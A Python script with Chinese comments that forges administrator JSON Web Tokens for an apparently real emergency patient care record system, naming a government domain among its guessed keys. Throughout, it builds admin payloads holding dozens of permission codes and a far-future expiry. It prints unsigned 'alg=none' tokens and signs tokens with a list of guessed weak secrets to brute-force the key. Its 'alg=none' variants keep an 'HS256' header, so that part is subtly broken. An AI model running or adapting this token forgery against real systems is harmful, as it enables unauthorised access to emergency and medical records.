import base64
import json
import hmac
import hashlib

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# 标准 JWT header
header = {"alg": "HS256", "typ": "JWT"}
# payload 含 EPCR_PAGE_CASELIST + user.role + sub + aud
# 依据 menuTop.html 的 23+ ui-sref state 与 EPCR_PAGE_* code
payload = {
    "sub": "admin",
    "user": {"role": "ADMIN"},
    "permissions": [
        "EPCR_PAGE_RESOURCEMANAGEMENT",
        "EPCR_PAGE_MONITOR",
        "EPCR_PAGE_CASELIST",
        "EPCR_PAGE_OHCACASELIST",
        "EPCR_PAGE_CHANGEHOS",
        "EPCR_PAGE_MCILIST",
        "EPCR_PAGE_BRANCHGROUP",
        "EPCR_PAGE_BRANCH",
        "EPCR_PAGE_AMBULANCE",
        "EPCR_PAGE_EMT",
        "EPCR_PAGE_HOSPITAL",
        "EPCR_PAGE_DEVICE",
        "EPCR_PAGE_EMTLEVEL",
        "EPCR_PAGE_EMTTRAINING",
        "EPCR_PAGE_EMTTRAININGTYPE",
        "EPCR_PAGE_STAT",
        "EPCR_PAGE_STAT_MANAGER",
        "EPCR_PAGE_CASESIMULATOR",
        "HOSPITAL_PAGE_HOSPITALCAPABILITYLIST",
        "EPCR_PAGE_SUPPLIES",
        "EPCR_PAGE_SUPPLIESCONFIG",
        "EPCR_PAGE_SUPPLIESQUERY",
        "EPCR_PAGE_SUPPLIESINVENTORY",
        "EPCR_PAGE_SUPPLIESSTOCKIN",
        "EPCR_PAGE_SUPPLIESSTOCKOUT",
        "EPCR_PAGE_SUPPLIESREQUEST",
        "EPCR_PAGE_SUPPLIESISSUANCE"
    ],
    "iat": 1700000000,
    "exp": 9999999999,
    "iss": "AuthServer"
}

h = b64url(json.dumps(header, separators=(',',':')).encode())
p = b64url(json.dumps(payload, separators=(',',':')).encode())
signing_input = f"{h}.{p}"

print(f"Header: {h}")
print(f"Payload: {p}")
print(f"Signing input: {signing_input}")
print()

# 变体 1: alg=none + 空签名
jwt_none = f"{signing_input}."
print(f"=== Variant 1: alg=none ===")
print(jwt_none)
print()

# 变体 2: HS256 弱密钥
weak_secrets = [
    "secret", "secret123", "password", "admin", "123456",
    "EPCR", "epcr", "tpf", "TPF", "viewlead", "EPCRServer",
    "EPCR_TPF_GOV_TW", "AuthServer", "3400", "8000",
    "epcr.tpf.gov.tw", "EPCR_KEY", "EP_SECRET", "EP_KEY",
    "epcr-secret", "epcr_secret", "epcr2020", "epcr2021",
    "epcr-admin", "tpf2020", "tpf123", "secretkey",
    "mysecret", "mykey", "my-secret", "my-key",
    "changeit", "12345", "qwerty", "abc123", "letmein"
]
print(f"=== Variant 2: HS256 with weak secrets ({len(weak_secrets)} keys) ===")
for secret in weak_secrets:
    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    sig_b64 = b64url(sig)
    jwt_hs = f"{signing_input}.{sig_b64}"
    print(f"{secret}: {jwt_hs[:60]}...")
print()

# 变体 3: 完整 admin payload (所有 76 权限位)
admin_payload_76 = {
    "sub": "admin",
    "user": {"role": "ADMIN", "name": "admin", "branchId": 1},
    "permissions": ["AUTH_USER_ALL", "AUTH_ROLE", "AUTH_2FA",
                    "EPCR_CASE_SCORE", "MONITOR_ALL", "EPCR_PAGE_BACKTRACK_ADMIN",
                    "EPCR_PAGE_RESOURCEMANAGEMENT","EPCR_PAGE_MONITOR","EPCR_PAGE_CASELIST",
                    "EPCR_PAGE_OHCACASELIST","EPCR_PAGE_CHANGEHOS","EPCR_PAGE_MCILIST",
                    "EPCR_PAGE_BRANCHGROUP","EPCR_PAGE_BRANCH","EPCR_PAGE_AMBULANCE",
                    "EPCR_PAGE_EMT","EPCR_PAGE_HOSPITAL","EPCR_PAGE_DEVICE",
                    "EPCR_PAGE_EMTLEVEL","EPCR_PAGE_EMTTRAINING","EPCR_PAGE_EMTTRAININGTYPE",
                    "EPCR_PAGE_STAT","EPCR_PAGE_STAT_MANAGER","EPCR_PAGE_CASESIMULATOR",
                    "HOSPITAL_PAGE_HOSPITALCAPABILITYLIST","EPCR_PAGE_SUPPLIES",
                    "EPCR_PAGE_SUPPLIESCONFIG","EPCR_PAGE_SUPPLIESQUERY","EPCR_PAGE_SUPPLIESINVENTORY",
                    "EPCR_PAGE_SUPPLIESSTOCKIN","EPCR_PAGE_SUPPLIESSTOCKOUT","EPCR_PAGE_SUPPLIESREQUEST",
                    "EPCR_PAGE_SUPPLIESISSUANCE","EPCR_DOCTOR_ORDER"],
    "iat": 1700000000,
    "exp": 9999999999,
    "iss": "AuthServer"
}
h2 = b64url(json.dumps(header, separators=(',',':')).encode())
p2 = b64url(json.dumps(admin_payload_76, separators=(',',':')).encode())
signing_input2 = f"{h2}.{p2}"
jwt_admin = f"{signing_input2}."  # alg=none variant
print(f"=== Variant 3: ADMIN role with alg=none ===")
print(jwt_admin)
print()

# 完整 admin HS256 弱密钥爆破
print(f"=== Variant 4: ADMIN role + HS256 weak secrets ===")
for secret in weak_secrets[:5]:
    sig = hmac.new(secret.encode(), signing_input2.encode(), hashlib.sha256).digest()
    sig_b64 = b64url(sig)
    print(f"{secret}: {h2}.{p2[:40]}...{sig_b64[:30]}")
